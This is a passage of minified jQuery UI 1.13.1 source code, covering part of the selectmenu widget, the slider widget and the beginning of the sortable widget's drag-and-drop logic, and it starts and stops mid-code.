ui-state-disabled":"")),e.appendTo(b),d=a.optgroup),c._renderItemData(b,a)})},_renderItemData:function(b,a){return this._renderItem(b,a).data("ui-selectmenu-item",a)},_renderItem:function(d,a){var b=$("<li>"),c=$("<div>",{title:a.element.attr("title")});return a.disabled&&this._addClass(b,null,"ui-state-disabled"),this._setText(c,a.label),b.append(c).appendTo(d)},_setText:function(a,b){b?a.text(b):a.html("&#160;")},_move:function(a,e){var b,d,c=".ui-menu-item";this.isOpen?b=this.menuItems.eq(this.focusIndex).parent("li"):(b=this.menuItems.eq(this.element[0].selectedIndex).parent("li"),c+=":not(.ui-state-disabled)"),(d="first"===a||"last"===a?b["first"===a?"prevAll":"nextAll"](c).eq(-1):b[a+"All"](c).eq(0)).length&&this.menuInstance.focus(e,d)},_getSelectedItem:function(){return this.menuItems.eq(this.element[0].selectedIndex).parent("li")},_toggle:function(a){this[this.isOpen?"close":"open"](a)},_setSelection:function(){var a;this.range&&(window.getSelection?((a=window.getSelection()).removeAllRanges(),a.addRange(this.range)):this.range.select(),this.button.focus())},_documentClick:{mousedown:function(a){this.isOpen&&($(a.target).closest(".ui-selectmenu-menu, #"+$.escapeSelector(this.ids.button)).length||this.close(a))}},_buttonEvents:{mousedown:function(){var a;window.getSelection?(a=window.getSelection()).rangeCount&&(this.range=a.getRangeAt(0)):this.range=document.selection.createRange()},click:function(a){this._setSelection(),this._toggle(a)},keydown:function(a){var b=!0;switch(a.keyCode){case $.ui.keyCode.TAB:case $.ui.keyCode.ESCAPE:this.close(a),b=!1;break;case $.ui.keyCode.ENTER:this.isOpen&&this._selectFocusedItem(a);break;case $.ui.keyCode.UP:a.altKey?this._toggle(a):this._move("prev",a);break;case $.ui.keyCode.DOWN:a.altKey?this._toggle(a):this._move("next",a);break;case $.ui.keyCode.SPACE:this.isOpen?this._selectFocusedItem(a):this._toggle(a);break;case $.ui.keyCode.LEFT:this._move("prev",a);break;case $.ui.keyCode.RIGHT:this._move("next",a);break;case $.ui.keyCode.HOME:case $.ui.keyCode.PAGE_UP:this._move("first",a);break;case $.ui.keyCode.END:case $.ui.keyCode.PAGE_DOWN:this._move("last",a);break;default:this.menu.trigger(a),b=!1}b&&a.preventDefault()}},_selectFocusedItem:function(b){var a=this.menuItems.eq(this.focusIndex).parent("li");a.hasClass("ui-state-disabled")||this._select(a.data("ui-selectmenu-item"),b)},_select:function(a,b){var c=this.element[0].selectedIndex;this.element[0].selectedIndex=a.index,this.buttonItem.replaceWith(this.buttonItem=this._renderButtonItem(a)),this._setAria(a),this._trigger("select",b,{item:a}),a.index!==c&&this._trigger("change",b,{item:a}),this.close(b)},_setAria:function(b){var a=this.menuItems.eq(b.index).attr("id");this.button.attr({"aria-labelledby":a,"aria-activedescendant":a}),this.menu.attr("aria-activedescendant",a)},_setOption:function(a,b){if("icons"===a){var c=this.button.find("span.ui-icon");this._removeClass(c,null,this.options.icons.button)._addClass(c,null,b.button)}this._super(a,b),"appendTo"===a&&this.menuWrap.appendTo(this._appendTo()),"width"===a&&this._resizeButton()},_setOptionDisabled:function(a){this._super(a),this.menuInstance.option("disabled",a),this.button.attr("aria-disabled",a),this._toggleClass(this.button,null,"ui-state-disabled",a),this.element.prop("disabled",a),a?(this.button.attr("tabindex",-1),this.close()):this.button.attr("tabindex",0)},_appendTo:function(){var a=this.options.appendTo;return a&&(a=a.jquery||a.nodeType?$(a):this.document.find(a).eq(0)),a&&a[0]||(a=this.element.closest(".ui-front, dialog")),a.length||(a=this.document[0].body),a},_toggleAttr:function(){this.button.attr("aria-expanded",this.isOpen),this._removeClass(this.button,"ui-selectmenu-button-"+(this.isOpen?"closed":"open"))._addClass(this.button,"ui-selectmenu-button-"+(this.isOpen?"open":"closed"))._toggleClass(this.menuWrap,"ui-selectmenu-open",null,this.isOpen),this.menu.attr("aria-hidden",!this.isOpen)},_resizeButton:function(){var a=this.options.width;if(!1===a){this.button.css("width","");return}null===a&&(a=this.element.show().outerWidth(),this.element.hide()),this.button.outerWidth(a)},_resizeMenu:function(){this.menu.outerWidth(Math.max(this.button.outerWidth(),this.menu.width("").outerWidth()+1))},_getCreateOptions:function(){var a=this._super();return a.disabled=this.element.prop("disabled"),a},_parseOptions:function(a){var c=this,b=[];a.each(function(d,a){a.hidden||b.push(c._parseOption($(a),d))}),this.items=b},_parseOption:function(a,c){var b=a.parent("optgroup");return{element:a,index:c,value:a.val(),label:a.text(),optgroup:b.attr("label")||"",disabled:b.prop("disabled")||a.prop("disabled")}},_destroy:function(){this._unbindFormResetHandler(),this.menuWrap.remove(),this.button.remove(),this.element.show(),this.element.removeUniqueId(),this.labels.attr("for",this.ids.element)}}]),$.widget("ui.slider",$.ui.mouse,{version:"1.13.1",widgetEventPrefix:"slide",options:{animate:!1,classes:{"ui-slider":"ui-corner-all","ui-slider-handle":"ui-corner-all","ui-slider-range":"ui-corner-all ui-widget-header"},distance:0,max:100,min:0,orientation:"horizontal",range:!1,step:1,value:0,values:null,change:null,slide:null,start:null,stop:null},numPages:5,_create:function(){this._keySliding=!1,this._mouseSliding=!1,this._animateOff=!0,this._handleIndex=null,this._detectOrientation(),this._mouseInit(),this._calculateNewMax(),this._addClass("ui-slider ui-slider-"+this.orientation,"ui-widget ui-widget-content"),this._refresh(),this._animateOff=!1},_refresh:function(){this._createRange(),this._createHandles(),this._setupEvents(),this._refreshValue()},_createHandles:function(){var c,b,d=this.options,a=this.element.find(".ui-slider-handle"),e=[];for(b=d.values&&d.values.length||1,a.length>b&&(a.slice(b).remove(),a=a.slice(0,b)),c=a.length;c<b;c++)e.push("<span tabindex='0'></span>");this.handles=a.add($(e.join("")).appendTo(this.element)),this._addClass(this.handles,"ui-slider-handle","ui-state-default"),this.handle=this.handles.eq(0),this.handles.each(function(a){$(this).data("ui-slider-handle-index",a).attr("tabIndex",0)})},_createRange:function(){var a=this.options;a.range?(!0===a.range&&(a.values?a.values.length&&2!==a.values.length?a.values=[a.values[0],a.values[0]]:Array.isArray(a.values)&&(a.values=a.values.slice(0)):a.values=[this._valueMin(),this._valueMin()]),this.range&&this.range.length?(this._removeClass(this.range,"ui-slider-range-min ui-slider-range-max"),this.range.css({left:"",bottom:""})):(this.range=$("<div>").appendTo(this.element),this._addClass(this.range,"ui-slider-range")),("min"===a.range||"max"===a.range)&&this._addClass(this.range,"ui-slider-range-"+a.range)):(this.range&&this.range.remove(),this.range=null)},_setupEvents:function(){this._off(this.handles),this._on(this.handles,this._handleEvents),this._hoverable(this.handles),this._focusable(this.handles)},_destroy:function(){this.handles.remove(),this.range&&this.range.remove(),this._mouseDestroy()},_mouseCapture:function(b){var e,f,h,a,c,d,g,j=this,i=this.options;return!i.disabled&&(this.elementSize={width:this.element.outerWidth(),height:this.element.outerHeight()},this.elementOffset=this.element.offset(),e={x:b.pageX,y:b.pageY},f=this._normValueFromMouse(e),h=this._valueMax()-this._valueMin()+1,this.handles.each(function(b){var d=Math.abs(f-j.values(b));(h>d||h===d&&(b===j._lastChangedValue||j.values(b)===i.min))&&(h=d,a=$(this),c=b)}),!1!==this._start(b,c)&&(this._mouseSliding=!0,this._handleIndex=c,this._addClass(a,null,"ui-state-active"),a.trigger("focus"),d=a.offset(),g=!$(b.target).parents().addBack().is(".ui-slider-handle"),this._clickOffset=g?{left:0,top:0}:{left:b.pageX-d.left-a.width()/2,top:b.pageY-d.top-a.height()/2-(parseInt(a.css("borderTopWidth"),10)||0)-(parseInt(a.css("borderBottomWidth"),10)||0)+(parseInt(a.css("marginTop"),10)||0)},this.handles.hasClass("ui-state-hover")||this._slide(b,c,f),this._animateOff=!0,!0))},_mouseStart:function(){return!0},_mouseDrag:function(a){var b={x:a.pageX,y:a.pageY},c=this._normValueFromMouse(b);return this._slide(a,this._handleIndex,c),!1},_mouseStop:function(a){return this._removeClass(this.handles,null,"ui-state-active"),this._mouseSliding=!1,this._stop(a,this._handleIndex),this._change(a,this._handleIndex),this._handleIndex=null,this._clickOffset=null,this._animateOff=!1,!1},_detectOrientation:function(){this.orientation="vertical"===this.options.orientation?"vertical":"horizontal"},_normValueFromMouse:function(d){var b,c,a,e,f;return"horizontal"===this.orientation?(b=this.elementSize.width,c=d.x-this.elementOffset.left-(this._clickOffset?this._clickOffset.left:0)):(b=this.elementSize.height,c=d.y-this.elementOffset.top-(this._clickOffset?this._clickOffset.top:0)),(a=c/b)>1&&(a=1),a<0&&(a=0),"vertical"===this.orientation&&(a=1-a),e=this._valueMax()-this._valueMin(),f=this._valueMin()+a*e,this._trimAlignValue(f)},_uiHash:function(b,a,d){var c={handle:this.handles[b],handleIndex:b,value:void 0!==a?a:this.value()};return this._hasMultipleValues()&&(c.value=void 0!==a?a:this.values(b),c.values=d||this.values()),c},_hasMultipleValues:function(){return this.options.values&&this.options.values.length},_start:function(a,b){return this._trigger("start",a,this._uiHash(b))},_slide:function(f,b,a){var c,d=this.value(),e=this.values();this._hasMultipleValues()&&(c=this.values(b?0:1),d=this.values(b),2===this.options.values.length&& !0===this.options.range&&(a=0===b?Math.min(c,a):Math.max(c,a)),e[b]=a),a!==d&& !1!==this._trigger("slide",f,this._uiHash(b,a,e))&&(this._hasMultipleValues()?this.values(b,a):this.value(a))},_stop:function(a,b){this._trigger("stop",a,this._uiHash(b))},_change:function(b,a){this._keySliding||this._mouseSliding||(this._lastChangedValue=a,this._trigger("change",b,this._uiHash(a)))},value:function(a){if(arguments.length){this.options.value=this._trimAlignValue(a),this._refreshValue(),this._change(null,0);return}return this._value()},values:function(b,e){var c,d,a;if(arguments.length>1){this.options.values[b]=this._trimAlignValue(e),this._refreshValue(),this._change(null,b);return}if(!arguments.length)return this._values();if(!Array.isArray(arguments[0]))return this._hasMultipleValues()?this._values(b):this.value();for(a=0,c=this.options.values,d=arguments[0];a<c.length;a+=1)c[a]=this._trimAlignValue(d[a]),this._change(null,a);this._refreshValue()},_setOption:function(c,a){var b,d=0;switch("range"===c&& !0===this.options.range&&("min"===a?(this.options.value=this._values(0),this.options.values=null):"max"===a&&(this.options.value=this._values(this.options.values.length-1),this.options.values=null)),Array.isArray(this.options.values)&&(d=this.options.values.length),this._super(c,a),c){case"orientation":this._detectOrientation(),this._removeClass("ui-slider-horizontal ui-slider-vertical")._addClass("ui-slider-"+this.orientation),this._refreshValue(),this.options.range&&this._refreshRange(a),this.handles.css("horizontal"===a?"bottom":"left","");break;case"value":this._animateOff=!0,this._refreshValue(),this._change(null,0),this._animateOff=!1;break;case"values":for(this._animateOff=!0,this._refreshValue(),b=d-1;b>=0;b--)this._change(null,b);this._animateOff=!1;break;case"step":case"min":case"max":this._animateOff=!0,this._calculateNewMax(),this._refreshValue(),this._animateOff=!1;break;case"range":this._animateOff=!0,this._refresh(),this._animateOff=!1}},_setOptionDisabled:function(a){this._super(a),this._toggleClass(null,"ui-state-disabled",!!a)},_value:function(){var a=this.options.value;return this._trimAlignValue(a)},_values:function(d){var c,a,b;if(arguments.length)return c=this.options.values[d],c=this._trimAlignValue(c);if(!this._hasMultipleValues())return[];for(b=0,a=this.options.values.slice();b<a.length;b+=1)a[b]=this._trimAlignValue(a[b]);return a},_trimAlignValue:function(a){if(a<=this._valueMin())return this._valueMin();if(a>=this._valueMax())return this._valueMax();var b=this.options.step>0?this.options.step:1,c=(a-this._valueMin())%b,d=a-c;return 2*Math.abs(c)>=b&&(d+=c>0?b:-b),parseFloat(d.toFixed(5))},_calculateNewMax:function(){var a=this.options.max,c=this._valueMin(),b=this.options.step;(a=Math.round((a-c)/b)*b+c)>this.options.max&&(a-=b),this.max=parseFloat(a.toFixed(this._precision()))},_precision:function(){var a=this._precisionOf(this.options.step);return null!==this.options.min&&(a=Math.max(a,this._precisionOf(this.options.min))),a},_precisionOf:function(c){var a=c.toString(),b=a.indexOf(".");return -1===b?0:a.length-b-1},_valueMin:function(){return this.options.min},_valueMax:function(){return this.max},_refreshRange:function(a){"vertical"===a&&this.range.css({width:"",left:""}),"horizontal"===a&&this.range.css({height:"",bottom:""})},_refreshValue:function(){var i,a,f,d,g,e=this.options.range,b=this.options,j=this,c=!this._animateOff&&b.animate,h={};this._hasMultipleValues()?this.handles.each(function(d){a=(j.values(d)-j._valueMin())/(j._valueMax()-j._valueMin())*100,h["horizontal"===j.orientation?"left":"bottom"]=a+"%",$(this).stop(1,1)[c?"animate":"css"](h,b.animate),!0===j.options.range&&("horizontal"===j.orientation?(0===d&&j.range.stop(1,1)[c?"animate":"css"]({left:a+"%"},b.animate),1===d&&j.range[c?"animate":"css"]({width:a-i+"%"},{queue:!1,duration:b.animate})):(0===d&&j.range.stop(1,1)[c?"animate":"css"]({bottom:a+"%"},b.animate),1===d&&j.range[c?"animate":"css"]({height:a-i+"%"},{queue:!1,duration:b.animate}))),i=a}):(f=this.value(),d=this._valueMin(),a=(g=this._valueMax())!==d?(f-d)/(g-d)*100:0,h["horizontal"===this.orientation?"left":"bottom"]=a+"%",this.handle.stop(1,1)[c?"animate":"css"](h,b.animate),"min"===e&&"horizontal"===this.orientation&&this.range.stop(1,1)[c?"animate":"css"]({width:a+"%"},b.animate),"max"===e&&"horizontal"===this.orientation&&this.range.stop(1,1)[c?"animate":"css"]({width:100-a+"%"},b.animate),"min"===e&&"vertical"===this.orientation&&this.range.stop(1,1)[c?"animate":"css"]({height:a+"%"},b.animate),"max"===e&&"vertical"===this.orientation&&this.range.stop(1,1)[c?"animate":"css"]({height:100-a+"%"},b.animate))},_handleEvents:{keydown:function(b){var c,a,d,e=$(b.target).data("ui-slider-handle-index");switch(b.keyCode){case $.ui.keyCode.HOME:case $.ui.keyCode.END:case $.ui.keyCode.PAGE_UP:case $.ui.keyCode.PAGE_DOWN:case $.ui.keyCode.UP:case $.ui.keyCode.RIGHT:case $.ui.keyCode.DOWN:case $.ui.keyCode.LEFT:if(b.preventDefault(),!this._keySliding&&(this._keySliding=!0,this._addClass($(b.target),null,"ui-state-active"),!1===this._start(b,e)))return}switch(d=this.options.step,c=a=this._hasMultipleValues()?this.values(e):this.value(),b.keyCode){case $.ui.keyCode.HOME:a=this._valueMin();break;case $.ui.keyCode.END:a=this._valueMax();break;case $.ui.keyCode.PAGE_UP:a=this._trimAlignValue(c+(this._valueMax()-this._valueMin())/this.numPages);break;case $.ui.keyCode.PAGE_DOWN:a=this._trimAlignValue(c-(this._valueMax()-this._valueMin())/this.numPages);break;case $.ui.keyCode.UP:case $.ui.keyCode.RIGHT:if(c===this._valueMax())return;a=this._trimAlignValue(c+d);break;case $.ui.keyCode.DOWN:case $.ui.keyCode.LEFT:if(c===this._valueMin())return;a=this._trimAlignValue(c-d)}this._slide(b,e,a)},keyup:function(a){var b=$(a.target).data("ui-slider-handle-index");this._keySliding&&(this._keySliding=!1,this._stop(a,b),this._change(a,b),this._removeClass($(a.target),null,"ui-state-active"))}}}),$.widget("ui.sortable",$.ui.mouse,{version:"1.13.1",widgetEventPrefix:"sort",ready:!1,options:{appendTo:"parent",axis:!1,connectWith:!1,containment:!1,cursor:"auto",cursorAt:!1,dropOnEmpty:!0,forcePlaceholderSize:!1,forceHelperSize:!1,grid:!1,handle:!1,helper:"original",items:"> *",opacity:!1,placeholder:!1,revert:!1,scroll:!0,scrollSensitivity:20,scrollSpeed:20,scope:"default",tolerance:"intersect",zIndex:1e3,activate:null,beforeStop:null,change:null,deactivate:null,out:null,over:null,receive:null,remove:null,sort:null,start:null,stop:null,update:null},_isOverAxis:function(a,b,c){return a>=b&&a<b+c},_isFloating:function(a){return/left|right/.test(a.css("float"))||/inline|table-cell/.test(a.css("display"))},_create:function(){this.containerCache={},this._addClass("ui-sortable"),this.refresh(),this.offset=this.element.offset(),this._mouseInit(),this._setHandleClassName(),this.ready=!0},_setOption:function(a,b){this._super(a,b),"handle"===a&&this._setHandleClassName()},_setHandleClassName:function(){var a=this;this._removeClass(this.element.find(".ui-sortable-handle"),"ui-sortable-handle"),$.each(this.items,function(){a._addClass(this.instance.options.handle?this.item.find(this.instance.options.handle):this.item,"ui-sortable-handle")})},_destroy:function(){this._mouseDestroy();for(var a=this.items.length-1;a>=0;a--)this.items[a].item.removeData(this.widgetName+"-item");return this},_mouseCapture:function(a,d){var b=null,e=!1,c=this;return!this.reverting&& !this.options.disabled&&"static"!==this.options.type&&(this._refreshItems(a),$(a.target).parents().each(function(){if($.data(this,c.widgetName+"-item")===c)return b=$(this),!1}),$.data(a.target,c.widgetName+"-item")===c&&(b=$(a.target)),!!b&&(!this.options.handle||!!d||($(this.options.handle,b).find("*").addBack().each(function(){this===a.target&&(e=!0)}),!!e))&&(this.currentItem=b,this._removeCurrentsFromItems(),!0))},_mouseStart:function(b,f,e){var c,d,a=this.options;if(this.currentContainer=this,this.refreshPositions(),this.appendTo=$("parent"!==a.appendTo?a.appendTo:this.currentItem.parent()),this.helper=this._createHelper(b),this._cacheHelperProportions(),this._cacheMargins(),this.offset=this.currentItem.offset(),this.offset={top:this.offset.top-this.margins.top,left:this.offset.left-this.margins.left},$.extend(this.offset,{click:{left:b.pageX-this.offset.left,top:b.pageY-this.offset.top},relative:this._getRelativeOffset()}),this.helper.css("position","absolute"),this.cssPosition=this.helper.css("position"),a.cursorAt&&this._adjustOffsetFromHelper(a.cursorAt),this.domPosition={prev:this.currentItem.prev()[0],parent:this.currentItem.parent()[0]},this.helper[0]!==this.currentItem[0]&&this.currentItem.hide(),this._createPlaceholder(),this.scrollParent=this.placeholder.scrollParent(),$.extend(this.offset,{parent:this._getParentOffset()}),a.containment&&this._setContainment(),a.cursor&&"auto"!==a.cursor&&(d=this.document.find("body"),this.storedCursor=d.css("cursor"),d.css("cursor",a.cursor),this.storedStylesheet=$("<style>*{ cursor: "+a.cursor+" !important; }</style>").appendTo(d)),a.zIndex&&(this.helper.css("zIndex")&&(this._storedZIndex=this.helper.css("zIndex")),this.helper.css("zIndex",a.zIndex)),a.opacity&&(this.helper.css("opacity")&&(this._storedOpacity=this.helper.css("opacity")),this.helper.css("opacity",a.opacity)),this.scrollParent[0]!==this.document[0]&&"HTML"!==this.scrollParent[0].tagName&&(this.overflowOffset=this.scrollParent.offset()),this._trigger("start",b,this._uiHash()),this._preserveHelperProportions||this._cacheHelperProportions(),!e)for(c=this.containers.length-1;c>=0;c--)this.containers[c]._trigger("activate",b,this._uiHash(this));return $.ui.ddmanager&&($.ui.ddmanager.current=this),$.ui.ddmanager&&!a.dropBehaviour&&$.ui.ddmanager.prepareOffsets(this,b),this.dragging=!0,this._addClass(this.helper,"ui-sortable-helper"),this.helper.parent().is(this.appendTo)||(this.helper.detach().appendTo(this.appendTo),this.offset.parent=this._getParentOffset()),this.position=this.originalPosition=this._generatePosition(b),this.originalPageX=b.pageX,this.originalPageY=b.pageY,this.lastPositionAbs=this.positionAbs=this._convertPositionTo("absolute"),this._mouseDrag(b),!0},_scroll:function(c){var a=this.options,b=!1;return this.scrollParent[0]!==this.document[0]&&"HTML"!==this.scrollParent[0].tagName?(this.overflowOffset.top+this.scrollParent[0].offsetHeight-c.pageY<a.scrollSensitivity?this.scrollParent[0].scrollTop=b=this.scrollParent[0].scrollTop+a.scrollSpeed:c.pageY-this.overflowOffset.top<a.scrollSensitivity&&(this.scrollParent[0].scrollTop=b=this.scrollParent[0].scrollTop-a.scrollSpeed),this.overflowOffset.left+this.scrollParent[0].offsetWidth-c.pageX<a.scrollSensitivity?this.scrollParent[0].scrollLeft=b=this.scrollParent[0].scrollLeft+a.scrollSpeed:c.pageX-this.overflowOffset.left<a.scrollSensitivity&&(this.scrollParent[0].scrollLeft=b=this.scrollParent[0].scrollLeft-a.scrollSpeed)):(c.pageY-this.document.scrollTop()<a.scrollSensitivity?b=this.document.scrollTop(this.document.scrollTop()-a.scrollSpeed):this.window.height()-(c.pageY-this.document.scrollTop())<a.scrollSensitivity&&(b=this.document.scrollTop(this.document.scrollTop()+a.scrollSpeed)),c.pageX-this.document.scrollLeft()<a.scrollSensitivity?b=this.document.scrollLeft(this.document.scrollLeft()-a.scrollSpeed):this.window.width()-(c.pageX-this.document.scrollLeft())<a.scrollSensitivity&&(b=this.document.scrollLeft(this.document.scrollLeft()+a.scrollSpeed))),b},_mouseDrag:function(a){var d,b,c,e,f=this.options;for(this.position=this._generatePosition(a),this.positionAbs=this._convertPositionTo("absolute"),this.options.axis&&"y"===this.options.axis||(this.helper[0].style.left=this.position.left+"px"),this.options.axis&&"x"===this.options.axis||(this.helper[0].style.top=this.position.top+"px"),f.scroll&& !1!==this._scroll(a)&&(this._refreshItemPositions(!0),$.ui.ddmanager&&!f.dropBehaviour&&$.ui.ddmanager.prepareOffsets(this,a)),this.dragDirection={vertical:this._getDragVerticalDirection(),horizontal:this._getDragHorizontalDirection()},d=this.items.length-1;d>=0;d--)if(c=(b=this.items[d]).item[0],(e=this._intersectsWithPointer(b))&&b.instance===this.currentContainer&&c!==this.currentItem[0]&&this.placeholder[1===e?"next":"prev"]()[0]!==c&&!$.contains(this.placeholder[0],c)&&("semi-dynamic"!==this.options.type||!$.contains(this.element[0],c))){if(this.direction=1===e?"down":"up","pointer"===this.options.tolerance||this._intersectsWithSides(b))this._rearrange(a,b);else break;this._trigger("change",a,this._uiHash());break}return this._contactContainers(a),$.ui.ddmanager&&$.ui.ddmanager.drag(this,a),this._trigger("sort",a,this._uiHash()),this.lastPositionAbs=this.positionAbs,!1},_mouseStop:function(b,e){if(b){if($.ui.ddmanager&&!this.options.dropBehaviour&&$.ui.ddmanager.drop(this,b),this.options.revert){var f=this,d=this.placeholder.offset(),a=this.options.axis,c={};a&&"x"!==a||(c.left=d.left-this.offset.parent.left-this.margins.left+(this.offsetParent[0]===this.document[0].body?0:this.offsetParent[0].scrollLeft)),a&&"y"!==a||(c.top=d.top-this.offset.parent.top-this.margins.top+(this.offsetParent[0]===this.document[0].body?0:this.offsetParent[0].scrollTop)),this.reverting=!0,$(this.helper).animate(c,parseInt(this.options.revert,10)||500,function(){f._clear(b)})}else this._clear(b,e);return!1}},cancel:function(){if(this.dragging){this._mouseUp(new $.Event("mouseup",{target:null})),"original"===this.options.helper?(this.currentItem.css(this._storedCSS),this._removeClass(this.currentItem,"ui-sortable-helper")):this.currentItem.show();for(var a=this.containers.length-1;a>=0;a--)this.containers[a]._trigger("deactivate",null,this._uiHash(this)),this.containers[a].containerCache.over&&(this.containers[a]._trigger("out",null,this._uiHash(this)),this.containers[a].containerCache.over=0)}return this.placeholder&&(this.placeholder[0].parentNode&&this.placeholder[0].parentNode.removeChild(this.placeholder[0]),"original"!==this.options.helper&&this.helper&&this.helper[0].parentNode&&this.helper.remove(),$.extend(this,{helper:null,dragging:!1,reverting:!1,_noFinalSort:null}),this.domPosition.prev?$(this.domPosition.prev).after(this.currentItem):$(this.domPosition.parent).prepend(this.currentItem)),this},serialize:function(a){var c=this._getItemsAsjQuery(a&&a.connected),b=[];return a=a||{},$(c).each(function(){var c=($(a.item||this).attr(a.attribute||"id")||"").match(a.expression||/(.+)[\-=_](.+)/);c&&b.push((a.key||c[1]+"[]")+"="+(a.key&&a.expression?c[1]:c[2]))}),!b.length&&a.key&&b.push(a.key+"="),b.join("&")},toArray:function(a){var b=this._getItemsAsjQuery(a&&a.connected),c=[];return a=a||{},b.each(function(){c.push($(a.item||this).attr(a.attribute||"id")||"")}),c},_intersectsWith:function(a){var b=this.positionAbs.left,j=b+this.helperProportions.width,c=this.positionAbs.top,k=c+this.helperProportions.height,d=a.left,f=d+a.width,e=a.top,g=e+a.height,h=this.offset.click.top,i=this.offset.click.left,l="x"===this.options.axis||c+h>e&&c+h<g,m="y"===this.options.axis||b+i>d&&b+i<f;return"pointer"===this.options.tolerance||this.options.forcePointerForContainers||"pointer"!==this.options.tolerance&&this.helperProportions[this.floating?"width":"height"]>a[this.floating?"width":"height"]?l&&m:d<b+this.helperProportions.width/2&&j-this.helperProportions.width/2<f&&e<c+this.helperProportions.height/2&&k-this.helperProportions.height/2<g},_intersectsWithPointer:function(a){var b,c,d="x"===this.options.axis||this._isOverAxis(this.positionAbs.top+this.offset.click.top,a.top,a.height),e="y"===this.options.axis||this._isOverAxis(this.positionAbs.left+this.offset.click.left,a.left,a.width);return!!d&&!!e&&(b=this.dragDirection.vertical,c=this.dragDirection.horizontal,this.floating?"right"===c||"down"===b?2:1:b&&("down"===b?2:1))},_intersectsWithSides:function(a){var d=this._isOverAxis(this.positionAbs.top+this.offset.click.top,a.top+a.height/2,a.height),e=this._isOverAxis(this.positionAbs.left+this.offset.click.left,a.left+a.width/2,a.width),b=this.dragDirection.vertical,c=this.dragDirection.horizontal;return this.floating&&c?"right"===c&&e||"left"===c&&!e:b&&("down"===b&&d||"up"===b&&!d)},_getDragVerticalDirection:function(){var a=this.positionAbs.top-this.lastPositionAbs.top;return 0!==a&&(a>0?"down":"up")},_getDragHorizontalDirection:function(){var a=this.positionAbs.left-this.lastPositionAbs.left;return 0!==a&&(a>0?"right":"left")},refresh:function(a){return this._refreshItems(a),this._setHandleClassName(),this.refreshPositions(),this},_connectWith:function(){var a=this.options;return a.connectWith.constructor===String?[a.connectWith]:a.connectWith},_getItemsAsjQuery:function(g){var b,c,f,a,h=[],d=[],e=this._connectWith();if(e&&g)for(b=e.length-1;b>=0;b--)for(c=(f=$(e[b],this.document[0])).length-1;c>=0;c--)(a=$.data(f[c],this.widgetFullName))&&a!==this&&!a.options.disabled&&d.push(["function"==typeof a.options.items?a.options.items.call(a.element):$(a.options.items,a.element).not(".ui-sortable-helper").not(".ui-sortable-placeholder"),a]);function i(){h.push(this)}for(d.push(["function"==typeof this.options.items?this.options.items.call(this.element,null,{options:this.options,item:this.currentItem}):$(this.options.items,this.element).not(".ui-sortable-helper").not(".ui-sortable-placeholder"),this]),b=d.length-1;b>=0;b--)d[b][0].each(i);return $(h)},_removeCurrentsFromItems:function(){var a=this.currentItem.find(":data("+this.widgetName+"-item)");this.items=$.grep(this.items,function(c){for(var b=0;b<a.length;b++)if(a[b]===c.item[0])return!1;return!0})},_refreshItems:function(h){this.items=[],this.containers=[this];var b,c,i,a,e,f,j,k,l=this.items,d=[["function"==typeof this.options.items?this.options.items.call(this.element[0],h,{item:this.currentItem}):$(this.options.items,this.element),this]],g=this._connectWith();if(g&&this.ready)for(b=g.length-1;b>=0;b--)for(c=(i=$(g[b],this.document[0])).length-1;c>=0;c--)(a=$.data(i[c],this.widgetFullName))&&a!==this&&!a.options.disabled&&(d.push(["function"==typeof a.options.items?a.options.items.call(a.element[0],h,{item:this.currentItem}):$(a.options.items,a.element),a]),this.containers.push(a));for(b=d.length-1;b>=0;b--)for(c=0,e=d[b][1],f=d[b][0],k=f.length;c<k;c++)(j=$(f[c])).data(this.widgetName+"-item",e),l.push({item:j,instance:e,width:0,height:0,left:0,top:0})},_refreshItemPositions:function(e){var b,a,c,d;for(b=this.items.length-1;b>=0;b--)a=this.items[b],this.currentContainer&&a.instance!==this.currentContainer&&a.item[0]!==this.currentItem[0]||(c=this.options.toleranceElement?$(this.options.toleranceElement,a.item):a.item,e||(a.width=c.outerWidth(),a.height=c.outerHeight()),d=c.offset(),a.left=d.left,a.top=d.top)},refreshPositions:function(c){var a,b;if(this.floating=!!this.items.length&&("x"===this.options.axis||this._isFloating(this.items[0].item)),this.offsetParent&&this.helper&&(this.offset.parent=this._getParentOffset()),this._refreshItemPositions(c),this.options.custom&&this.options.custom.refreshContainers)this.options.custom.refreshContainers.call(this);else for(a=this.containers.length-1;a>=0;a--)b=this.containers[a].element.offset(),this.containers[a].containerCache.left=b.left,this.containers[a].containerCache.top=b.top,this.containers[a].containerCache.width=this.containers[a].element.outerWidth(),this.containers[a].containerCache.height=this.containers[a].element.outerHeight();return this},_createPlaceholder:function(a){var c,d,b=(a=a||this).options;b.placeholder&&b.placeholder.constructor!==String||(c=b.placeholder,d=a.currentItem[0].nodeName.toLowerCase(),b.placeholder={element:function(){var b=$("<"+d+">",a.document[0]);return a._addClass(b,"ui-sortable-placeholder",c||a.currentItem[0].className)._removeClass(b,"ui-sortable-helper"),"tbody"===d?a._createTrPlaceholder(a.currentItem.find("tr").eq(0),$("<tr>",a.document[0]).appendTo(b)):"tr"===d?a._createTrPlaceholder(a.currentItem,b):"img"===d&&b.attr("src",a.currentItem.attr("src")),c||b.css("visibility","hidden"),b},update:function(f,e){(!c||b.forcePlaceholderSize)&&((!e.height()||b.forcePlaceholderSize&&("tbody"===d||"tr"===d))&&e.height(a.currentItem.innerHeight()-parseInt(a.currentItem.css("paddingTop")||0,10)-parseInt(a.currentItem.css("paddingBottom")||0,10)),e.width()||e.width(a.currentItem.innerWidth()-parseInt(a.currentItem.css("paddingLeft")||0,10)-parseInt(a.currentItem.css("paddingRight")||0,10)))}}),a.placeholder=$(b.placeholder.element.call(a.element,a.currentItem)),a.currentItem.after(a.placeholder),b.placeholder.update(a,a.placeholder)},_createTrPlaceholder:function(a,b){var c=this;a.children().each(function(){$("<td>&#160;</td>",c.document[0]).attr("colspan",$(this).attr("colspan")||1).appendTo(b)})},_contactContainers:function(b){var c,d,i,e,l,m,g,j,k,h,f=null,a=null;for(c=this.containers.length-1;c>=0;c--)if(!$.contains(this.currentItem[0],this.containers[c].element[0])){if(this._intersectsWith(this.containers[c].containerCache)){if(f&&$.contains(this.containers[c].element[0],f.element[0]))continue;f=this.containers[c],a=c}else 